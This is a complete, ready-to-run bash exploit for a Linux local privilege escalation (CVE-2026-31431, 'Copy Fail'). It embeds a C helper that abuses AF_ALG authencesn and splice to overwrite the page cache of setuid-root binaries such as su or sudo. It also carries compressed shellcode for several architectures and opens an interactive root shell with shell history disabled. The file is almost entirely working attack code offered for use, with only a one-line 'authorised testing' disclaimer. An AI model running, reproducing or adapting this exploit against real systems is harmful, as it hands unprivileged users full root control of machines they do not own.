#!/usr/bin/env bash
# CVE-2026-31431 — Copy Fail — Bash implementation
# Local privilege escalation via AF_ALG / authencesn page cache corruption.
# Requires: gcc, Linux kernel with AF_ALG support (virtually all distros since 2017).
# Original discovery: Theori / Xint Code (April 2026)
# Bash impl: compiles a minimal C helper inline; no files left on disk after exec.

set -euo pipefail

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
die()  { echo "[!] $*" >&2; exit 1; }
info() { echo "[*] $*"; }
ok()   { echo "[+] $*"; }

usage() {
  cat >&2 <<EOF
Usage: $0 [OPTIONS]

Options:
  -t PATH   Target setuid-root binary (default: auto-detect)
  -e CMD    Execute CMD as root instead of /bin/sh (full path required)
  -c        Check system compatibility only
  -s        Scan and list all setuid-root binaries
  -h        Show this help

CVE-2026-31431 (Copy Fail) — AF_ALG/authencesn page cache corruption LPE.
For authorised security testing only.
EOF
  exit 1
}

# ---------------------------------------------------------------------------
# Architecture → zlib-compressed shellcode hex
# Payloads from badsectorlabs/copyfail-go (exec /bin/sh variant)
# ---------------------------------------------------------------------------
payload_for_arch() {
  local arch="$1"
  case "$arch" in
    x86_64)
      echo "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
      ;;
    aarch64|arm64)
      echo "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578"
      ;;
    i386|i686)
      echo "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40b806c80461569098000383e101c3db1bae9e6d303c1090a1af5f9c91a19f9499d7f93820b8f361e7a10ddc4089db598c11671b0038b31858"
      ;;
    armv7l|armv6l|arm)
      echo "789cab77f57163646464800126060d06102f84c181c10426c8c2c06ac2a0c000538550ed00c61d40128459e1b20b1e8b172c780c64bc9760e87fc42000642b2c78cc0d1503c93342d9fa499979fac5190c00aca71742"
      ;;
    *)
      return 1
      ;;
  esac
}

# ---------------------------------------------------------------------------
# Find a setuid-root binary
# ---------------------------------------------------------------------------
find_target() {
  local candidates=(
    /usr/bin/su /bin/su /usr/bin/passwd /usr/bin/sudo
    /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn
    /usr/bin/umount /usr/bin/mount /usr/bin/pkexec
  )
  for p in "${candidates[@]}"; do
    [[ -f "$p" ]] || continue
    local mode uid
    mode=$(stat -c '%a' "$p" 2>/dev/null) || continue
    uid=$(stat -c '%u'  "$p" 2>/dev/null) || continue
    # setuid bit = mode & 04000; owner = root (uid 0)
    (( uid == 0 )) && (( (8#$mode & 04000) != 0 )) && { echo "$p"; return 0; }
  done
  return 1
}

# ---------------------------------------------------------------------------
# Scan all setuid-root binaries
# ---------------------------------------------------------------------------
scan_targets() {
  info "Scanning for setuid-root binaries…"
  local count=0
  while IFS= read -r -d '' f; do
    local mode uid
    mode=$(stat -c '%a' "$f" 2>/dev/null) || continue
    uid=$(stat -c '%u'  "$f" 2>/dev/null) || continue
    (( uid == 0 )) && (( (8#$mode & 04000) != 0 )) && { echo "  $f"; (( count++ )); }
  done < <(find /usr /bin /sbin /opt /snap /lib -type f -print0 2>/dev/null)
  info "Found $count setuid-root binaries."
}

# ---------------------------------------------------------------------------
# Compatibility check
# ---------------------------------------------------------------------------
check_compat() {
  local ok=0

  info "Kernel  : $(uname -r)"
  local arch; arch=$(uname -m)
  info "Arch    : $arch"
  info "UID     : $(id -u)"

  (( $(id -u) == 0 )) && { echo "[!] Already root."; return 1; }

  if payload_for_arch "$arch" >/dev/null 2>&1; then
    ok "[payload] supported"
  else
    echo "[!] Arch $arch not supported." >&2; ok=1
  fi

  command -v gcc >/dev/null 2>&1 \
    && ok "[gcc]     found: $(gcc --version | head -1)" \
    || { echo "[!] gcc not found (required to compile inline C helper)" >&2; ok=1; }

  if python3 -c "import socket; s=socket.socket(socket.AF_ALG,socket.SOCK_SEQPACKET,0); s.close()" 2>/dev/null; then
    ok "[AF_ALG]  available"
  else
    echo "[!] AF_ALG not available." >&2; ok=1
  fi

  local target
  if target=$(find_target); then
    ok "[target]  $target (setuid-root)"
  else
    echo "[!] No setuid-root binary found." >&2; ok=1
  fi

  return $ok
}

# ---------------------------------------------------------------------------
# Inline C exploit helper
# The C code handles all kernel-level operations: AF_ALG socket, sendmsg,
# pipe, splice — none of which are accessible from pure bash.
# ---------------------------------------------------------------------------
write_c_source() {
  local dest="$1"
  cat > "$dest" << 'CSRC'
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/if_alg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#define SOL_ALG               279
#define ALG_SET_KEY             1
#define ALG_SET_IV              2
#define ALG_SET_OP              3
#define ALG_SET_AEAD_ASSOCLEN   4
#define ALG_SET_AEAD_AUTHSIZE   5

/* splice(2) wrapper — not always in libc headers */
static ssize_t do_splice(int fd_in, loff_t *off_in,
                         int fd_out, loff_t *off_out,
                         size_t len, unsigned int flags)
{
  return (ssize_t)syscall(SYS_splice, fd_in, off_in, fd_out, off_out, len, flags);
}

/* Build a single CMSG in caller-supplied buffer; returns total byte count. */
static size_t pack_cmsg(char *buf, int level, int type,
                        const void *data, socklen_t dlen)
{
  struct cmsghdr *h = (struct cmsghdr *)buf;
  h->cmsg_level = level;
  h->cmsg_type  = type;
  h->cmsg_len   = CMSG_LEN(dlen);
  memcpy(CMSG_DATA(h), data, dlen);
  return CMSG_SPACE(dlen);
}

/*
 * write4 — core exploit primitive.
 * Triggers the authencesn scratch write to corrupt 4 bytes of the target
 * file's page cache at byte offset `t` with the bytes in `data[0..3]`.
 */
static void write4(int file_fd, int t, const uint8_t *data)
{
  /* 1. Create AF_ALG socket bound to the vulnerable algorithm */
  int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
  if (alg_fd < 0) { perror("socket(AF_ALG)"); exit(1); }

  struct sockaddr_alg sa = {
    .salg_family = AF_ALG,
    .salg_type   = "aead",
    .salg_name   = "authencesn(hmac(sha256),cbc(aes))",
  };
  if (bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
    perror("bind(AF_ALG)"); exit(1);
  }

  /* 2. Set key — format: "0800010000000010" + 32 zero bytes
   *   Bytes: 08 00 01 00 00 00 00 10 [00 * 32]
   *   nlattr header (len=8, type=1=AUTHENC_PARAM_ENCKEYLEN) + __be32 enckeylen=16
   *   followed by 16 bytes authkey + 16 bytes enckey (all zeros) */
  uint8_t key[40] = {
    0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10,
    0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0
  };
  if (setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) < 0) {
    perror("setsockopt(KEY)"); exit(1);
  }
  int authsize = 4;
  if (setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, authsize) < 0) {
    perror("setsockopt(AUTHSIZE)"); exit(1);
  }

  /* 3. Accept operational socket (use raw syscall: accept(2) with NULL addr) */
  int op_fd = (int)syscall(SYS_accept4, alg_fd, 0, 0, 0);
  if (op_fd < 0) { perror("accept4(AF_ALG)"); exit(1); }

  /* 4. Build control messages */
  char cmsg_buf[
    CMSG_SPACE(4) +          /* ALG_SET_OP  (decrypt=0) */
    CMSG_SPACE(20) +         /* ALG_SET_IV  (16-byte IV + 4-byte len prefix) */
    CMSG_SPACE(4)            /* ALG_SET_AEAD_ASSOCLEN */
  ];
  memset(cmsg_buf, 0, sizeof(cmsg_buf));

  char  *p   = cmsg_buf;
  uint32_t op   = 0;                           /* ALG_OP_DECRYPT */
  uint8_t  iv[20]; memset(iv, 0, sizeof(iv)); iv[0] = 0x10; /* len=16 */
  uint32_t assoc = 8;

  p += pack_cmsg(p, SOL_ALG, ALG_SET_OP,            &op,    4);
  p += pack_cmsg(p, SOL_ALG, ALG_SET_IV,            iv,    20);
  p += pack_cmsg(p, SOL_ALG, ALG_SET_AEAD_ASSOCLEN, &assoc, 4);

  /* 5. sendmsg: "AAAA" (8-byte AAD) + 4-byte payload as seqno_lo */
  uint8_t msg_data[8];
  memcpy(msg_data,     "AAAA", 4);
  memcpy(msg_data + 4, data,   4);

  struct iovec iov = { .iov_base = msg_data, .iov_len = sizeof(msg_data) };
  struct msghdr mhdr = {
    .msg_iov        = &iov,
    .msg_iovlen     = 1,
    .msg_control    = cmsg_buf,
    .msg_controllen = (socklen_t)(p - cmsg_buf),
  };
  if (sendmsg(op_fd, &mhdr, MSG_MORE) < 0) {
    perror("sendmsg"); exit(1);
  }

  /* 6. Pipe for splice staging */
  int pfd[2];
  if (pipe(pfd) < 0) { perror("pipe"); exit(1); }

  /* 7. splice: file page cache → pipe → crypto socket */
  int n = t + 4;
  loff_t off = 0;
  if (do_splice(file_fd, &off, pfd[1], NULL, n, 0) < 0) {
    perror("splice(file→pipe)"); exit(1);
  }
  if (do_splice(pfd[0], NULL, op_fd, NULL, n, 0) < 0) {
    perror("splice(pipe→socket)"); exit(1);
  }

  /* 8. Trigger the overwrite; EBADMSG expected (HMAC fails), write already done */
  uint8_t *rbuf = malloc(8 + t + 1);
  read(op_fd, rbuf, 8 + t + 1);   /* ignore EBADMSG */
  free(rbuf);

  close(pfd[0]); close(pfd[1]);
  close(op_fd);
  close(alg_fd);
}

int main(int argc, char *argv[])
{
  if (argc < 3) {
    fprintf(stderr, "usage: %s <target> <payload_file>\n", argv[0]);
    return 1;
  }
  const char *target_path  = argv[1];
  const char *payload_path = argv[2];

  /* Load shellcode */
  FILE *pf = fopen(payload_path, "rb");
  if (!pf) { perror("fopen(payload)"); return 1; }
  fseek(pf, 0, SEEK_END); long plen = ftell(pf); rewind(pf);
  uint8_t *payload = malloc(plen + 4);
  fread(payload, 1, plen, pf);
  fclose(pf);
  /* Pad to 4-byte boundary */
  while (plen % 4) payload[plen++] = 0;

  /* Open target read-only */
  int tfd = open(target_path, O_RDONLY);
  if (tfd < 0) { perror("open(target)"); return 1; }

  int bar_width = 20;
  printf("[*] Overwriting page cache of %s...\n", target_path);
  fflush(stdout);
  for (int i = 0; i < plen; i += 4) {
    write4(tfd, i, payload + i);
    int done = (i + 4) * bar_width / plen;
    int pct  = (i + 4) * 100   / plen;
    printf("\r  [");
    for (int j = 0; j < done; j++) putchar('#');
    for (int j = done; j < bar_width; j++) putchar('-');
    printf("] %5d/%ld (%3d%%)", i + 4, plen, pct);
    fflush(stdout);
  }
  printf("\n[+] Done. %ld bytes written to page cache.\n", plen);
  fflush(stdout);

  close(tfd);
  free(payload);
  return 0;
}
CSRC
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
OPT_TARGET=""
OPT_EXEC=""
OPT_CHECK=0
OPT_SCAN=0

while getopts ":t:e:csh" opt; do
  case "$opt" in
    t) OPT_TARGET="$OPTARG" ;;
    e) OPT_EXEC="$OPTARG"   ;;
    c) OPT_CHECK=1           ;;
    s) OPT_SCAN=1            ;;
    h) usage                 ;;
    :) die "Option -$OPTARG requires an argument." ;;
    \?) die "Unknown option: -$OPTARG" ;;
  esac
done

(( OPT_SCAN ))  && { scan_targets; exit 0; }
(( OPT_CHECK )) && { check_compat; exit $?; }

# --- Pre-flight ---
[[ "$(uname -s)" == "Linux" ]] || die "Linux only."
(( $(id -u) == 0 )) && die "Already root — nothing to do."
command -v gcc >/dev/null 2>&1 || die "gcc not found (needed to compile inline C helper)."

ARCH=$(uname -m)
ZLIB_HEX=$(payload_for_arch "$ARCH") || die "Unsupported architecture: $ARCH"

if [[ -z "$OPT_TARGET" ]]; then
  OPT_TARGET=$(find_target) || die "No setuid-root binary found. Use -s to scan, or -t to specify one."
fi
[[ -f "$OPT_TARGET" ]] || die "Target not found: $OPT_TARGET"

info "Target  : $OPT_TARGET"
info "Arch    : $ARCH"

# --- Workspace (cleaned up on exit) ---
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

# --- Decompress shellcode ---
PAYLOAD_BIN="$WORK/payload.bin"
RAW_LEN=$(python3 - "$ZLIB_HEX" "$PAYLOAD_BIN" << 'PYEOF'
import sys, zlib, binascii
data = zlib.decompress(binascii.unhexlify(sys.argv[1]))
pad = (4 - len(data) % 4) % 4
open(sys.argv[2], 'wb').write(data + b'\x00' * pad)
print(len(data))
PYEOF
) || die "Payload decompression failed."
info "Payload : ${RAW_LEN} bytes"

# --- Compile C helper ---
C_SRC="$WORK/exploit.c"
C_BIN="$WORK/exploit"
write_c_source "$C_SRC"
gcc -O2 -o "$C_BIN" "$C_SRC" || die "Compilation failed."
ok "Compiled inline C helper."

# --- Run overwrite ---
"$C_BIN" "$OPT_TARGET" "$PAYLOAD_BIN" || die "Exploit helper failed."

# --- Spawn interactive root shell on PTY ---
ok "Spawning root shell on fully interactive PTY..."
ROWS=$(tput lines 2>/dev/null || echo 24)
COLS=$(tput cols  2>/dev/null || echo 80)
python3 - "$OPT_TARGET" "$ROWS" "$COLS" << 'PYEOF'
import pty, os, sys, tty, select, termios, struct, fcntl, time

target = sys.argv[1]
rows   = int(sys.argv[2])
cols   = int(sys.argv[3])

master, slave = pty.openpty()
fcntl.ioctl(master, termios.TIOCSWINSZ, struct.pack('HHHH', rows, cols, 0, 0))

pid = os.fork()
if pid == 0:
    os.setsid()
    fcntl.ioctl(slave, termios.TIOCSCTTY, 0)
    for fd in (0, 1, 2):
        os.dup2(slave, fd)
    os.close(master)
    os.close(slave)
    os.execv(target, [target])
    os._exit(1)

os.close(slave)
time.sleep(0.3)
setup = ('bash\n'
         f' stty rows {rows} cols {cols}\n'
         ' export TERM=xterm-256color\n'
         ' export SHELL=/bin/bash\n'
         ' export HISTFILE=\n'
         ' stty sane\n'
         ' [ -f /etc/skel/.bashrc ] && source /etc/skel/.bashrc 2>/dev/null\n'
         ' [ -f ~/.bashrc ] && source ~/.bashrc 2>/dev/null\n')
os.write(master, setup.encode())

is_tty = os.isatty(sys.stdin.fileno())
old = termios.tcgetattr(sys.stdin.fileno()) if is_tty else None
if is_tty:
    tty.setraw(sys.stdin.fileno())
try:
    while True:
        r, _, _ = select.select([master, sys.stdin], [], [], 0.05)
        if master in r:
            try:
                data = os.read(master, 4096)
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()
            except OSError:
                break
        if sys.stdin in r:
            data = os.read(sys.stdin.fileno(), 4096)
            if not data:
                break
            os.write(master, data)
except Exception:
    pass
finally:
    if is_tty and old is not None:
        termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, old)
    print()
os.waitpid(pid, 0)
PYEOF
